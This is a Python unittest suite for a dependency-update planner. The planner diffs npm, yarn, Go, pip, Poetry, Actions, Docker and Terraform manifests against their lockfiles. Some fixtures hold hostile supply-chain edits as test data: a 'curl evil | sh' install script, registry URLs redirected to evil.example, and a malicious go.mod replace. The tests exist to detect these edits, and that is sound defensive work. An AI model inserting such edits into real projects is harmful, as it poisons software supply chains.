"""plan(): the manifest and lockfile diff is the update list."""

from __future__ import annotations

import itertools
import json
import unittest

import dependency_manifest_diff as diff
from dependency_manifest_diff import Change
from test_dependency_manifest_grammars import pipfile_lock_text, poetry_lock_text

_BASE = "base"


def _plan(base: dict[str, str], head: dict[str, str], renames: dict[str, str] | None = None) -> diff.Plan:
    """plan() over two file maps. A path in only one map was added or deleted; `renames` maps new path to old."""
    renames = renames or {}
    old_paths = {new: old for new, old in renames.items()}
    changed: list[tuple[str, str, str]] = []
    for path in sorted(set(base) | set(head)):
        if path in renames.values():
            continue
        old = old_paths.get(path, path)
        if path not in head:
            changed.append((path, path, "D"))
        elif old not in base:
            changed.append((path, path, "A"))
        elif base[old] != head[path] or old != path:
            changed.append((old, path, "R" if old != path else "M"))

    def read(revision: str, path: str) -> str:
        return (base if revision == _BASE else head).get(path, "")

    return diff.plan(changed, read, _BASE)


def _package(**sections: dict[str, str]) -> str:
    return json.dumps({"name": "app", "version": "1.0.0", **sections}, indent=2) + "\n"


def _npm_lock(packages: dict[str, str], root: dict[str, str] | None = None) -> str:
    entries: dict[str, dict] = {"": {"name": "app", "dependencies": root or {}}}
    for path, version in packages.items():
        name = path.rsplit("node_modules/", 1)[1]
        entries[path] = {
            "version": version,
            "resolved": f"https://registry.npmjs.org/{name}/-/{name.rsplit('/', 1)[-1]}-{version}.tgz",
            "integrity": f"sha512-{name}-{version}",
        }
    return json.dumps({"name": "app", "lockfileVersion": 3, "packages": entries}, indent=2) + "\n"


def _yarn(*stanzas: tuple[str, str]) -> str:
    body = "".join(
        f'\n{header}:\n  version "{version}"\n'
        f'  resolved "https://registry.yarnpkg.com/{header.rsplit("@", 1)[0]}/-/{header.rsplit("@", 1)[0]}-{version}.tgz"\n'
        for header, version in stanzas
    )
    return "# yarn lockfile v1\n" + body


class NpmTest(unittest.TestCase):
    def test_a_declared_dependency_takes_its_versions_from_the_lock(self) -> None:
        base = {
            "package.json": _package(dependencies={"lodash": "^4.17.20"}),
            "package-lock.json": _npm_lock(
                {
                    "node_modules/lodash": "4.17.20",
                    "node_modules/qs": "6.5.2",
                    "node_modules/express/node_modules/lodash": "3.10.0",
                },
                {"lodash": "^4.17.20"},
            ),
        }
        head = {
            "package.json": _package(dependencies={"lodash": "^4.17.21"}),
            "package-lock.json": _npm_lock(
                {
                    "node_modules/lodash": "4.17.21",
                    "node_modules/qs": "6.5.3",
                    "node_modules/express/node_modules/lodash": "3.10.1",
                },
                {"lodash": "^4.17.21"},
            ),
        }
        plan = _plan(base, head)
        self.assertEqual(plan.primary, (Change("npm", ".", "lodash", "4.17.20", "4.17.21"),))
        self.assertEqual(
            plan.unchecked,
            (Change("npm", ".", "lodash", "3.10.0", "3.10.1"), Change("npm", ".", "qs", "6.5.2", "6.5.3")),
        )
        self.assertEqual((plan.gaps, plan.unparsed_locks), ((), ()))

    def test_a_lockfile_only_bump_of_a_declared_dependency_is_primary(self) -> None:
        package = _package(devDependencies={"prettier": "^3.0.0"})
        base = {"package.json": package, "package-lock.json": _npm_lock({"node_modules/prettier": "3.9.8"})}
        head = {"package.json": package, "package-lock.json": _npm_lock({"node_modules/prettier": "3.9.9"})}
        self.assertEqual(_plan(base, head).primary, (Change("npm", ".", "prettier", "3.9.8", "3.9.9"),))

    def test_a_transitive_only_bump_is_disclosed_and_nothing_is_primary(self) -> None:
        package = _package(dependencies={"express": "^4.0.0"})
        base = {"package.json": package, "package-lock.json": _npm_lock({"node_modules/qs": "6.5.2"})}
        head = {"package.json": package, "package-lock.json": _npm_lock({"node_modules/qs": "6.5.3"})}
        plan = _plan(base, head)
        self.assertEqual(plan.primary, ())
        self.assertEqual(plan.unchecked, (Change("npm", ".", "qs", "6.5.2", "6.5.3"),))

    def test_added_and_removed_lock_copies_are_unchecked_upgrades(self) -> None:
        package = _package(dependencies={"a": "1.0.0"})
        base = {
            "package.json": package,
            "package-lock.json": _npm_lock({"node_modules/a": "1.0.0", "node_modules/old": "1.0.0"}),
        }
        head = {
            "package.json": package,
            "package-lock.json": _npm_lock({"node_modules/a": "1.0.0", "node_modules/new": "2.0.0"}),
        }
        plan = _plan(base, head)
        self.assertEqual(plan.primary, ())
        self.assertEqual(
            plan.unchecked, (Change("npm", ".", "new", "", "2.0.0"), Change("npm", ".", "old", "1.0.0", ""))
        )

    def test_a_lock_without_a_manifest_beside_it_is_a_gap(self) -> None:
        base = {"web/package-lock.json": _npm_lock({"node_modules/qs": "6.5.2"})}
        head = {"web/package-lock.json": _npm_lock({"node_modules/qs": "6.5.3"})}
        plan = _plan(base, head)
        self.assertEqual((plan.primary, plan.unchecked), ((), ()))
        self.assertEqual(plan.gaps, (("web/package-lock.json", "unresolved"),))

    def test_a_manifest_without_a_lock_gives_its_specs(self) -> None:
        base = {"package.json": _package(dependencies={"left-pad": "1.2.3", "chalk": "^5.0.0"})}
        head = {"package.json": _package(dependencies={"left-pad": "1.2.4", "chalk": "^5.1.0"})}
        self.assertEqual(
            _plan(base, head).primary,
            (Change("npm", ".", "chalk", "^5.0.0", "^5.1.0"), Change("npm", ".", "left-pad", "1.2.3", "1.2.4")),
        )

    def test_a_manifest_change_the_lock_beside_it_does_not_move_is_a_gap(self) -> None:
        lock = _npm_lock({"node_modules/chalk": "5.1.2"})
        base = {"package.json": _package(dependencies={"chalk": "^5.0.0"}), "package-lock.json": lock}
        head = {"package.json": _package(dependencies={"chalk": "^5.1.0"}), "package-lock.json": lock}
        self.assertEqual(_plan(base, head), diff.Plan((), (), (("package.json", "unresolved"),), ()))

    def test_a_name_added_to_the_manifest_but_not_installed_by_the_lock_is_a_gap(self) -> None:
        base = {
            "package.json": _package(dependencies={"lodash": "^4.17.20"}),
            "package-lock.json": _npm_lock({"node_modules/lodash": "4.17.20"}),
        }
        head = {
            "package.json": _package(dependencies={"lodash": "^4.17.21", "evil": "1.0.0"}),
            "package-lock.json": _npm_lock({"node_modules/lodash": "4.17.21"}),
        }
        plan = _plan(base, head)
        self.assertEqual(plan.primary, (Change("npm", ".", "lodash", "4.17.20", "4.17.21"),))
        self.assertEqual(plan.gaps, (("package.json", "unresolved"),))

    def _swap(self, path: str, **fields: str) -> diff.Plan:
        """lodash 4.17.20 -> 4.17.21 with `fields` replaced on the head record at `path`."""
        package = _package(dependencies={"lodash": "^4.17.20"})
        base_lock = _npm_lock({"node_modules/lodash": "4.17.20", "node_modules/minimist": "1.2.8"})
        head_lock = json.loads(_npm_lock({"node_modules/lodash": "4.17.21", "node_modules/minimist": "1.2.8"}))
        head_lock["packages"][path].update(fields)
        return _plan(
            {"package.json": package, "package-lock.json": base_lock},
            {"package.json": package, "package-lock.json": json.dumps(head_lock)},
        )

    def test_a_lock_record_that_changed_at_an_unchanged_version_is_a_gap(self) -> None:
        plan = self._swap("node_modules/minimist", integrity="sha512-other")
        self.assertEqual((plan.primary, plan.unchecked), ((), ()))
        self.assertEqual(plan.gaps, (("package-lock.json", "unresolved"),))

    def test_a_copy_installed_from_another_source_is_never_an_exact_registry_version(self) -> None:
        evil = "https://evil.example/minimist.tgz"
        plan = self._swap("node_modules/minimist", resolved=evil)
        self.assertEqual(plan.unchecked, (Change("npm", ".", "minimist", "1.2.8", f"1.2.8 ({evil})"),))
        for fields in ({"resolved": "https://evil.example/l.tgz"}, {"name": "evil"}):
            with self.subTest(fields=fields):
                (primary,) = self._swap("node_modules/lodash", **fields).primary
                self.assertEqual(primary[:4], ("npm", ".", "lodash", "4.17.20"))
                self.assertTrue(primary.new.startswith("4.17.21 ("), primary)

    def test_a_git_dependency_moved_to_another_commit_is_not_an_exact_version(self) -> None:
        package = _package(dependencies={"tool": "github:org/tool"})
        stanza = (
            'tool@github:org/tool:\n  version "1.0.0"\n  resolved "https://codeload.github.com/org/tool/tar.gz/{}"\n'
        )
        plan = _plan(
            {"package.json": package, "yarn.lock": stanza.format("a" * 40)},
            {"package.json": package, "yarn.lock": stanza.format("b" * 40)},
        )
        (primary,) = plan.primary
        self.assertEqual(primary.new, f"1.0.0 (https://codeload.github.com/org/tool/tar.gz/{'b' * 40})")

    def test_a_range_added_to_a_yarn_stanza_header_at_the_same_version_is_a_gap(self) -> None:
        base = {
            "package.json": _package(dependencies={"lodash": "^4.17.0"}),
            "yarn.lock": _yarn(("lodash@^4.17.0", "4.17.21")),
        }
        head = {
            "package.json": _package(dependencies={"lodash": "^4.17.21"}),
            "yarn.lock": _yarn(("lodash@^4.17.0", "4.17.21")).replace(
                "lodash@^4.17.0:", "lodash@^4.17.0, lodash@^4.17.21:"
            ),
        }
        self.assertEqual(
            _plan(base, head), diff.Plan(gaps=(("package.json", "unresolved"), ("yarn.lock", "unresolved")))
        )

    def test_a_yarn_header_range_change_alone_is_a_gap(self) -> None:
        package = _package(dependencies={"lodash": "^4.17.0"})
        base = {"package.json": package, "yarn.lock": _yarn(("lodash@^4.17.0", "4.17.21"))}
        head = {"package.json": package, "yarn.lock": _yarn(("lodash@^4.17.21", "4.17.21"))}
        self.assertEqual(_plan(base, head), diff.Plan(gaps=(("yarn.lock", "unresolved"),)))

    def test_a_lock_root_range_change_at_an_unchanged_version_is_a_gap(self) -> None:
        package = _package(dependencies={"lodash": "^4.17.0"})
        installed = {"node_modules/lodash": "4.17.21"}
        base = {"package.json": package, "package-lock.json": _npm_lock(installed, {"lodash": "^4.17.0"})}
        head = {"package.json": package, "package-lock.json": _npm_lock(installed, {"lodash": "^4.17.21"})}
        self.assertEqual(_plan(base, head), diff.Plan(gaps=(("package-lock.json", "unresolved"),)))

    def test_a_lock_root_range_that_moves_with_its_version_is_a_primary_change(self) -> None:
        base = {
            "package.json": _package(dependencies={"lodash": "^4.17.20"}),
            "package-lock.json": _npm_lock({"node_modules/lodash": "4.17.20"}, {"lodash": "^4.17.20"}),
        }
        head = {
            "package.json": _package(dependencies={"lodash": "^4.17.21"}),
            "package-lock.json": _npm_lock({"node_modules/lodash": "4.17.21"}, {"lodash": "^4.17.21"}),
        }
        primary = (Change("npm", ".", "lodash", "4.17.20", "4.17.21"),)
        self.assertEqual(_plan(base, head), diff.Plan(primary=primary, hashed=("package-lock.json",)))

    def test_manifest_text_outside_the_dependency_entries_is_a_gap(self) -> None:
        base = {"package.json": _package(dependencies={"a": "1.0.0"}, scripts={"test": "jest"})}
        head = {"package.json": _package(dependencies={"a": "1.0.1"}, scripts={"test": "curl evil | sh"})}
        plan = _plan(base, head)
        self.assertEqual(plan.primary, ())
        self.assertEqual(plan.gaps, (("package.json", "unresolved"),))

    def test_unparsable_json_is_a_gap(self) -> None:
        base = {"package.json": _package(dependencies={"a": "1.0.0"})}
        head = {"package.json": "{not json"}
        self.assertEqual(_plan(base, head).gaps, (("package.json", "unresolved"),))

    def test_yarn_stanzas_are_declared_copies(self) -> None:
        package = _package(dependencies={"ua-parser-js": "^0.7.18"})
        base = {
            "package.json": package,
            "yarn.lock": _yarn(("ua-parser-js@^0.7.18", "0.7.22"), ("minimist@^1.2.0", "1.2.5")),
        }
        head = {
            "package.json": package,
            "yarn.lock": _yarn(("ua-parser-js@^0.7.18", "0.7.31"), ("minimist@^1.2.0", "1.2.8")),
        }
        plan = _plan(base, head)
        self.assertEqual(plan.primary, (Change("npm", ".", "ua-parser-js", "0.7.22", "0.7.31"),))
        self.assertEqual(plan.unchecked, (Change("npm", ".", "minimist", "1.2.5", "1.2.8"),))

    def test_a_name_with_two_moved_copies_is_not_one_version(self) -> None:
        package = _package(dependencies={"debug": "^4.0.0"})
        base = {"package.json": package, "yarn.lock": _yarn(("debug@^4.0.0", "4.3.1"), ("debug@^2.6.9", "2.6.9"))}
        head = {"package.json": package, "yarn.lock": _yarn(("debug@^4.0.0", "4.3.4"), ("debug@^2.6.9", "2.6.8"))}
        self.assertEqual(_plan(base, head).primary, (Change("npm", ".", "debug", "2.6.9, 4.3.1", "2.6.8, 4.3.4"),))

    def test_a_yarn_berry_lock_is_a_gap(self) -> None:
        package = _package(dependencies={"lodash": "^4.17.0"})
        berry = '__metadata:\n  version: 6\n\n"lodash@npm:^4.17.0":\n  version: {}\n'
        base = {"package.json": package, "yarn.lock": berry.format("4.17.20")}
        head = {"package.json": package, "yarn.lock": berry.format("4.17.21")}
        plan = _plan(base, head)
        self.assertEqual(plan.primary, ())
        self.assertEqual(plan.gaps, (("yarn.lock", "unresolved"),))

    def test_an_unparsed_lock_beside_a_primary_change_is_disclosed(self) -> None:
        base = {"package.json": _package(dependencies={"zod": "3.22.0"}), "pnpm-lock.yaml": "lockfileVersion: '9.0'\n"}
        head = {
            "package.json": _package(dependencies={"zod": "3.22.4"}),
            "pnpm-lock.yaml": "lockfileVersion: '9.0'\n#\n",
        }
        plan = _plan(base, head)
        self.assertEqual(plan.primary, (Change("npm", ".", "zod", "3.22.0", "3.22.4"),))
        self.assertEqual((plan.gaps, plan.unparsed_locks), ((), ("pnpm-lock.yaml",)))

    def test_an_unparsed_lock_with_no_primary_change_beside_it_is_a_gap(self) -> None:
        package = _package(dependencies={"zod": "^3.22.0"})
        base = {"package.json": package, "pnpm-lock.yaml": "a\n"}
        head = {"package.json": package, "pnpm-lock.yaml": "b\n"}
        plan = _plan(base, head)
        self.assertEqual((plan.primary, plan.unparsed_locks), ((), ()))
        self.assertEqual(plan.gaps, (("pnpm-lock.yaml", "unresolved"),))


class GoTest(unittest.TestCase):
    _MOD = "module example.com/app\n\ngo 1.22\n\nrequire (\n\tgithub.com/spf13/cobra {}\n\tgolang.org/x/sys {} // indirect\n)\n"

    @staticmethod
    def _sum(*lines: tuple[str, str]) -> str:
        return "".join(f"{module} {version} h1:{module}-{version}=\n" for module, version in lines)

    def _bump(self, base_sum: str, head_sum: str) -> diff.Plan:
        """cobra v1.8.0 -> v1.8.1 and sys v0.20.0 -> v0.21.0 in go.mod, beside `base_sum` -> `head_sum`."""
        return _plan(
            {"go.mod": self._MOD.format("v1.8.0", "v0.20.0"), "go.sum": base_sum},
            {"go.mod": self._MOD.format("v1.8.1", "v0.21.0"), "go.sum": head_sum},
        )

    def test_direct_requires_are_primary_and_indirect_requires_are_unchecked(self) -> None:
        cobra, sys = "github.com/spf13/cobra", "golang.org/x/sys"
        plan = self._bump(
            self._sum((cobra, "v1.8.0"), (cobra, "v1.8.0/go.mod"), (sys, "v0.20.0/go.mod")),
            self._sum((cobra, "v1.8.0/go.mod"), (cobra, "v1.8.1"), (cobra, "v1.8.1/go.mod"), (sys, "v0.21.0/go.mod")),
        )
        self.assertEqual(plan.primary, (Change("go", ".", cobra, "v1.8.0", "v1.8.1"),))
        self.assertEqual(plan.unchecked, (Change("go", ".", sys, "v0.20.0", "v0.21.0"),))
        self.assertEqual(plan.gaps, ())

    def test_a_go_sum_version_no_go_mod_move_accounts_for_is_unchecked(self) -> None:
        cobra, other = "github.com/spf13/cobra", "github.com/other/mod"
        plan = self._bump(
            self._sum((cobra, "v1.8.0")),
            self._sum((cobra, "v1.8.1"), (other, "v0.2.0/go.mod")),
        )
        self.assertEqual(plan.primary, (Change("go", ".", cobra, "v1.8.0", "v1.8.1"),))
        self.assertIn(Change("go", ".", other, "", "v0.2.0/go.mod"), plan.unchecked)
        self.assertEqual(plan.gaps, ())

    def test_a_go_sum_version_outside_the_go_mod_move_is_unchecked(self) -> None:
        cobra = "github.com/spf13/cobra"
        plan = self._bump(self._sum((cobra, "v1.8.0")), self._sum((cobra, "v1.9.0")))
        self.assertIn(Change("go", ".", cobra, "v1.8.0", "v1.9.0"), plan.unchecked)

    def test_a_go_sum_hash_change_at_an_unchanged_version_is_a_gap(self) -> None:
        cobra = "github.com/spf13/cobra"
        base_sum = self._sum((cobra, "v1.8.0"), ("golang.org/x/sys", "v0.20.0"))
        head_sum = base_sum.replace("h1:golang.org/x/sys-v0.20.0=", "h1:other=") + self._sum((cobra, "v1.8.1"))
        self.assertEqual(self._bump(base_sum, head_sum).gaps, (("go.sum", "unresolved"),))

    def test_a_go_sum_change_alone_is_a_gap_or_unchecked(self) -> None:
        self.assertEqual(_plan({"go.sum": "a\n"}, {"go.sum": "b\n"}), diff.Plan(gaps=(("go.sum", "unresolved"),)))
        module = "github.com/spf13/cobra"
        plan = _plan({"go.sum": self._sum((module, "v1.8.0"))}, {"go.sum": self._sum((module, "v1.8.1"))})
        self.assertEqual(
            plan, diff.Plan(unchecked=(Change("go", ".", module, "v1.8.0", "v1.8.1"),), hashed=("go.sum",))
        )

    def test_a_directive_or_replace_change_is_a_gap(self) -> None:
        base = {"go.mod": self._MOD.format("v1.8.0", "v0.20.0")}
        for head_mod in (
            base["go.mod"].replace("go 1.22", "go 1.23"),
            base["go.mod"] + "replace github.com/spf13/cobra => github.com/evil/cobra v1.8.0\n",
        ):
            with self.subTest(head=head_mod):
                plan = _plan(base, {"go.mod": head_mod})
                self.assertEqual(plan.gaps, (("go.mod", "unresolved"),))


class PythonTest(unittest.TestCase):
    def test_requirement_pins_are_primary_under_their_pep_503_names(self) -> None:
        base = {"requirements/dev.txt": "Flask_SQLAlchemy==3.0.0\nrequests==2.31.0  # http\n"}
        head = {"requirements/dev.txt": "Flask_SQLAlchemy==3.1.0\nrequests==2.31.0  # http\n"}
        self.assertEqual(
            _plan(base, head).primary,
            (Change("pip", "requirements", "flask-sqlalchemy", "==3.0.0", "==3.1.0"),),
        )

    def test_text_beside_a_pin_on_its_line_cannot_change_unseen(self) -> None:
        base = {"pyproject.toml": '[project]\ndependencies = ["requests==2.31.0"]\n'}
        for head in (
            '[project]\ndependencies = ["requests==2.32.0", "evil @ https://evil.example/e.tar.gz"]\n',
            '[project]\ndependencies = ["requests[socks]==2.32.0"]\n',
        ):
            with self.subTest(head=head):
                plan = _plan(base, {"pyproject.toml": head})
                self.assertEqual(plan.primary, ())
                self.assertEqual(plan.gaps, (("pyproject.toml", "unresolved"),))

    def test_a_hash_change_at_an_unchanged_pin_is_a_gap(self) -> None:
        base = {"requirements.txt": "requests==2.31.0 --hash=sha256:aaa\n"}
        head = {"requirements.txt": "requests==2.31.0 --hash=sha256:bbb\n"}
        self.assertEqual(_plan(base, head).gaps, (("requirements.txt", "unresolved"),))

    def test_a_requirement_pinned_with_hashes_moves_its_hashes_with_its_version(self) -> None:
        line = "requests==2.31.0 \\\n    --hash=sha256:aaa \\\n    --hash=sha256:bbb\n    # via app\n"
        base = {"requirements.txt": line}
        head = {"requirements.txt": "requests==2.32.0 \\\n    --hash=sha256:ccc\n    # via app\n"}
        plan = _plan(base, head)
        self.assertEqual(plan.primary, (Change("pip", ".", "requests", "==2.31.0", "==2.32.0"),))
        self.assertEqual((plan.gaps, plan.hashed), ((), ("requirements.txt",)))
        marked = head["requirements.txt"].replace(" \\\n    --hash", " ; os_name == 'nt' \\\n    --hash")
        self.assertEqual(_plan(base, {"requirements.txt": marked}).gaps, (("requirements.txt", "unresolved"),))

    def test_a_requirements_file_change_pip_reads_differently_or_not_at_all_is_a_gap(self) -> None:
        pin = "sigstore=={} --hash=sha256:{}\n"
        base, head = pin.format("3.5.0", "0" * 64), pin.format("3.6.1", "1" * 64)
        cases = {
            "toml header": ("[packages]\n" + base, "[packages]\n" + head),
            "poetry header": ("[tool.poetry.dependencies]\n" + base, "[tool.poetry.dependencies]\n" + head),
            "toml dependency": ('sigstore = "3.5.0"\n', 'sigstore = "3.6.1"\n'),
            "quoted": (f'"{base.strip()}"\n', f'"{head.strip()}"\n'),
            "an option beside the hash": (base, head.replace(" --hash", " --config-settings a=b --hash")),
            "a marker": (base, head.replace(" --hash", " ; os_name == 'nt' --hash")),
            "an invalid tail": (base.replace(" --hash", " x --hash"), head.replace(" --hash", " x --hash")),
            "an invalid marker": (
                base.replace(" --hash", " ; os_name == --hash"),
                head.replace(" --hash", " ; os_name == --hash"),
            ),
            "a tab before a hash": (base.replace(" --hash", "\t--hash"), head.replace(" --hash", "\t--hash")),
        }
        for extra in ("!={}", ">{}", "<2"):
            cases[f"=={{}},{extra}"] = tuple(
                pin.format(f"{version},{extra.format(version)}", digest)
                for version, digest in (("3.5.0", "0" * 64), ("3.6.1", "1" * 64))
            )
        for option in ("-r", "-c", "-e", "--index-url", "--extra-index-url", "-i", "-f"):
            cases[option] = (f"{option} a\n{base}", f"{option} b\n{head}")
        for case, (before, after) in cases.items():
            with self.subTest(case=case):
                plan = _plan({"requirements.txt": before}, {"requirements.txt": after})
                self.assertEqual((plan.primary, plan.gaps), ((), (("requirements.txt", "unresolved"),)))

    def test_a_poetry_lock_supplies_the_versions_of_the_names_the_pyproject_declares(self) -> None:
        """A Poetry 1.1 lock, with its files in `[metadata.files]`, moves the same way."""
        manifest = '[tool.poetry.dependencies]\npython = "^3.11"\nrequests = "{}"\n'
        for (name, pin), legacy in itertools.product(
            (("lock-only update", ("^2.31", "^2.31")), ("pin and lock", ("2.31.0", "2.32.0"))), (False, True)
        ):
            with self.subTest(name, legacy=legacy):
                base = {
                    "pyproject.toml": manifest.format(pin[0]),
                    "poetry.lock": poetry_lock_text(
                        {"requests": "2.31.0", "idna": "3.6"}, content_hash="a", legacy=legacy
                    ),
                }
                head = {
                    "pyproject.toml": manifest.format(pin[1]),
                    "poetry.lock": poetry_lock_text(
                        {"requests": "2.32.0", "idna": "3.7"}, content_hash="b", legacy=legacy
                    ),
                }
                plan = _plan(base, head)
                self.assertEqual(plan.primary, (Change("pip", ".", "requests", "2.31.0", "2.32.0"),))
                self.assertEqual(plan.unchecked, (Change("pip", ".", "idna", "3.6", "3.7"),))
                self.assertEqual((plan.gaps, plan.unparsed_locks), ((), ()))

    def test_a_poetry_lock_change_outside_its_records_or_without_a_manifest_is_a_gap(self) -> None:
        manifest = {"pyproject.toml": '[tool.poetry.dependencies]\nrequests = "^2.31"\n'}
        base = poetry_lock_text({"requests": "2.31.0"})
        for name, head, files in (
            ("lock version", base.replace('"2.0"', '"2.1"').replace("2.31.0", "2.32.0"), manifest),
            ("unparsable", "[[package]\n", manifest),
            ("no manifest", poetry_lock_text({"requests": "2.32.0"}), {}),
        ):
            with self.subTest(name):
                plan = _plan({**files, "poetry.lock": base}, {**files, "poetry.lock": head})
                self.assertEqual((plan.primary, plan.gaps), ((), (("poetry.lock", "unresolved"),)))

    def test_a_pipfile_lock_supplies_the_versions_of_the_names_the_pipfile_declares(self) -> None:
        pipfile = {"Pipfile": '[packages]\nrequests = "*"\n'}
        base = {**pipfile, "Pipfile.lock": pipfile_lock_text({"requests": "2.31.0"}, meta_hash="a")}
        head = {**pipfile, "Pipfile.lock": pipfile_lock_text({"requests": "2.32.0"}, meta_hash="b")}
        self.assertEqual(
            _plan(base, head),
            diff.Plan(primary=(Change("pip", ".", "requests", "==2.31.0", "==2.32.0"),), hashed=("Pipfile.lock",)),
        )


class LineGrammarTest(unittest.TestCase):
    _WORKFLOW = "on: push\njobs:\n  build:\n    steps:\n      - uses: actions/checkout@{}\n      - uses: ./local\n"

    def test_action_refs_are_primary_and_repeated_bumps_are_one_change(self) -> None:
        base = {
            ".github/workflows/ci.yml": self._WORKFLOW.format("v4"),
            ".github/workflows/release.yml": self._WORKFLOW.format("v4"),
        }
        head = {
            ".github/workflows/ci.yml": self._WORKFLOW.format("v5"),
            ".github/workflows/release.yml": self._WORKFLOW.format("v5"),
        }
        self.assertEqual(
            _plan(base, head).primary,
            (Change("github-actions", ".github/workflows", "actions/checkout", "v4", "v5"),),
        )

    def test_a_uses_line_that_changed_beside_its_ref_is_a_gap(self) -> None:
        base = {".github/workflows/ci.yml": self._WORKFLOW.format("v4")}
        head = {
            ".github/workflows/ci.yml": self._WORKFLOW.format("v5").replace("- uses:", "- if: always()\n        uses:")
        }
        self.assertEqual(_plan(base, head).gaps, ((".github/workflows/ci.yml", "unresolved"),))

    def test_a_workflow_change_outside_uses_lines_is_a_gap(self) -> None:
        base = {".github/workflows/ci.yml": self._WORKFLOW.format("v4")}
        head = {".github/workflows/ci.yml": self._WORKFLOW.format("v5").replace("on: push", "on: pull_request_target")}
        self.assertEqual(_plan(base, head).gaps, ((".github/workflows/ci.yml", "unresolved"),))

    def test_composite_action_refs_are_read(self) -> None:
        base = {"tools/setup/action.yml": "runs:\n  steps:\n    - uses: actions/setup-node@v4.0.1\n"}
        head = {"tools/setup/action.yml": "runs:\n  steps:\n    - uses: actions/setup-node@v4.0.2\n"}
        self.assertEqual(
            _plan(base, head).primary,
            (Change("github-actions", "tools/setup", "actions/setup-node", "v4.0.1", "v4.0.2"),),
        )

    def test_dockerfile_from_and_terraform_providers_are_primary(self) -> None:
        lock = (
            'provider "registry.terraform.io/hashicorp/aws" {{\n  version = "{}"\n  hashes = [\n    "h1:x",\n  ]\n}}\n'
        )
        base = {
            "Dockerfile": "FROM node:20.10 AS build\nRUN make\n",
            "infra/.terraform.lock.hcl": lock.format("5.30.0"),
        }
        head = {
            "Dockerfile": "FROM node:20.11 AS build\nRUN make\n",
            "infra/.terraform.lock.hcl": lock.format("5.31.0"),
        }
        self.assertEqual(
            _plan(base, head).primary,
            (
                Change("docker", ".", "node", "20.10", "20.11"),
                Change("terraform", "infra", "registry.terraform.io/hashicorp/aws", "5.30.0", "5.31.0"),
            ),
        )

    def test_terraform_version_lines_are_primary_and_any_other_edit_is_a_gap(self) -> None:
        module = 'module "vpc" {{\n  source  = "{}"\n  version = "{}"\n}}\n'
        base = {"infra/main.tf": module.format("terraform-aws-modules/vpc/aws", "5.1.2")}
        plan = _plan(base, {"infra/main.tf": module.format("terraform-aws-modules/vpc/aws", "5.2.0")})
        self.assertEqual(
            plan.primary, (Change("terraform", "infra", "terraform-aws-modules/vpc/aws", "5.1.2", "5.2.0"),)
        )
        for head in (
            module.format("git::https://evil.example/vpc", "5.2.0"),
            module.format("terraform-aws-modules/vpc/aws", "5.2.0") + 'resource "null_resource" "x" {}\n',
        ):
            with self.subTest(head=head):
                self.assertEqual(_plan(base, {"infra/main.tf": head}).gaps, (("infra/main.tf", "unresolved"),))


class ChangedPathTest(unittest.TestCase):
    def test_paths_that_are_not_dependency_files_are_gaps(self) -> None:
        plan = _plan({"README.md": "a\n", "src/lib.go": "a\n"}, {"README.md": "b\n", "src/lib.go": "b\n"})
        self.assertEqual(plan.gaps, (("README.md", "unresolved"), ("src/lib.go", "unresolved")))

    def test_manifests_with_no_grammar_are_unparsed_manifest_gaps(self) -> None:
        paths = ("Cargo.toml", "Package.swift", "src/App.csproj", "packages.config")
        plan = _plan({path: "a\n" for path in paths}, {path: "b\n" for path in paths})
        self.assertEqual(set(plan.gaps), {(path, "unparsed_manifest") for path in paths})

    def test_deleted_and_renamed_off_paths_are_gaps(self) -> None:
        base = {"requirements.txt": "requests==2.31.0\n", "package-lock.json": _npm_lock({})}
        head = {"NOTES.md": "requests==2.31.0\n"}
        plan = _plan(base, head, renames={"NOTES.md": "requirements.txt"})
        self.assertEqual(
            set(plan.gaps),
            {("package-lock.json", "unresolved"), ("requirements.txt", "unresolved"), ("NOTES.md", "unresolved")},
        )

    def test_a_renamed_manifest_compares_its_old_text(self) -> None:
        base = {"requirements.txt": "requests==2.31.0\n"}
        head = {"requirements-base.txt": "requests==2.32.0\n"}
        plan = _plan(base, head, renames={"requirements-base.txt": "requirements.txt"})
        self.assertEqual(plan.primary, (Change("pip", ".", "requests", "==2.31.0", "==2.32.0"),))

    def test_type_changes_are_gaps(self) -> None:
        plan = diff.plan([("requirements.txt", "requirements.txt", "T")], lambda *_args: "", _BASE)
        self.assertEqual(plan.gaps, (("requirements.txt", "unresolved"),))


if __name__ == "__main__":
    unittest.main()
